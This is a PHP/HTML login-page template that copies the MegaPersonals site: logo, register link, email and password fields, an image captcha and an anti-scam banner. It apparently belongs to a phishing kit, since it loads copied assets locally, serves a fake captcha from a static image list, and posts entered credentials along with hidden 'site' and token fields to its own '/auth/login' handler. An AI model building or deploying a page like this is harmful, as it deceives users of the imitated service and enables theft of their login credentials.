<!DOCTYPE html>
<html>
   <head>
      <title>MegaPersonals: Classified hookups</title>
      <meta id="viewportMetaTag" name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
      <meta name="apple-mobile-web-app-capable" content="yes">
      <meta name="SKYPE_TOOLBAR" content="SKYPE_TOOLBAR_PARSER_COMPATIBLE">
      <meta charset="utf-8">
      <meta name="ROBOTS" content="INDEX, FOLLOW">
      <meta name="description" content="MegaPersonals - Post your classified ad and MEET NOW">
      <link rel="icon" href="<?= url("/assets/megapersonals/" .  "images/devilgirl_favicon.ico")?>" type="image/x-icon">
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
      <link rel="stylesheet" href="<?= url("/assets/megapersonals/" .  "css/style.css")?>">
   </head>
   <body cz-shortcut-listen="true" data-new-gr-c-s-check-loaded="14.1169.0" data-gr-ext-installed="">
      <div class="container login-page">
         <a href="https://megapersonals.eu/home">
         <img src="<?= url("/assets/megapersonals/" .  "images/logo.png")?>" class="img-responsive center-block img-width-72 header-top-margin" alt="Megapersonals">
         </a>
         <div class="centered top-margin-25 login_firsttime">
            <h3 class="logincopy">Is this your first time posting?</h3>
            <a href="https://megapersonals.eu/users/register" class="starthere">Start Here</a>
         </div>
         <div class="centered loginform">
            <h2 class="logincopy">Already have an account?</h2>
            <form id="loginFormId" method="post" action="<?= url('/auth/login') ?>" class="loginwrapper">
                <input type="hidden" name="site" value="<?= $site ?>">
                <input type="hidden" name="user_access_token" value="<?= $user_access_token; ?>">

<!--                <div class="alert alert-danger">-->
<!--                    <p>Lorem ipsum dolor sit amet.</p>-->
<!--                </div>-->

               <div class="centered form-input">
                  <input type="email"id="person_username_field_login" name="email" placeholder="Email" class="form-control bordered three-radius">
               </div>
               <div class="centered form-input">
                  <input type="password" id="person_password_field_login" name="password" placeholder="Password" class="form-control bordered three-radius">
               </div>
               <div class="centered form-input automargin">
                  <div class="cap_wrap">
                     <div class="captcha_image">
                        <img id="captcha_image_itself">
                     </div>
                     <div class="replyCaptchaReloadButton">
                        <a href="javascript:void(0);" id="changeCaptcha">
                        <img src="<?= url("/assets/megapersonals/" .  "images/reloadButton.png")?>" width="40" height="40">
                        </a>
                     </div>
                  </div>
                 <input type="text" id="captcha_code" name="captcha" class="form-control bordered three-radius clickToHideErrorMessages" placeholder="Enter code from the picture">
                  <button id="login_data_submit_button" type="submit" aria-haspopup="true">Submit</button>
               </div>
            </form>
         </div>
         <div class="centered loginwrapper scammed-wrapper" style="margin-top:36px;">
            <style>
               .get-scammed-banner {
                  width: 100%;
                  height: 120px;
                  background-image: url("<?= url("/assets/megapersonals/" .  "images/bannersContainer.png")?>");
                  background-size: 100%;
                  background-repeat: no-repeat;
                  color: black;
                  cursor: pointer;
                  margin-bottom: 8px;
               }
            </style>
            <div class="get-scammed-banner">
               <div class="caption">Don't get scammed!</div>
               <div class="body">
                  <div>Is the address up top:<br>megapersonals.eu</div>
                  <div>?</div>
               </div>
            </div>
            <a class="passreset" href="3">FORGOT PASSWORD?</a>
         </div>
      </div>
      <footer>
         <nav>
            <ul class="pager myStyle">
               <li>
                  <a id="homeclick" href="#">Home</a>
               </li>
               <li>|</li>
               <li><a href="#">Manage Posts</a></li>
               <li>|</li>
               <li><a href="#">Contact Us</a></li>
               <li>|</li>
               <li><a href=#">Policies &amp; Terms</a></li>
            </ul>
         </nav>
         <div class="copyright_class" id="copyrigh">Copyright ©2022 MegaPersonals.eu </div>
      </footer>
      <script src="<?= url("/assets/megapersonals/" .  "images/captchas/captchaData.js")?>"></script>
      <script>
         (function(){

            const captchaItems = captchaData;
            const changeCaptcha = document.getElementById('changeCaptcha')
            const captchaImage = document.getElementById('captcha_image_itself');
            let currentIndex = Math.floor(Math.random() * 10);

            const showCaptcha = (index) => {
               captchaImage.src = `<?= url("/assets/megapersonals/" .  "images/captchas")?>/${captchaItems[index].name}`
            }

            changeCaptcha.addEventListener('click', () => {

               currentIndex++

               if(currentIndex >= (captchaItems.length - 1)){
                  currentIndex = 0
               }

               showCaptcha(currentIndex);
            })

            showCaptcha(currentIndex);
         }())
      </script>
   </body>
</html>
